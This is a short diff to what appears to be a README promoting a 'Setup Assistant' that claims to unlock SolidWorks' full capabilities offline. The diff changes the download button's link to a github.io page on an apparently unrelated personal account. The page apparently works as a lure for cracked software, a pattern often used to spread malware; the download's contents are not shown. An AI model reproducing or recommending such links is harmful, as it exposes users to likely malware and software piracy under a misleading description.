@@ -5,7 +5,7 @@ Unlock the full capabilities of SolidWorks in secure, offline environments using
 ---
 
 🔘 **Download Setup Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-darkgreen)](https://solidworks-tools.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-darkgreen)](https://jaimepriceixsd.github.io/.github/solidworks-tools)
 
 ---
 
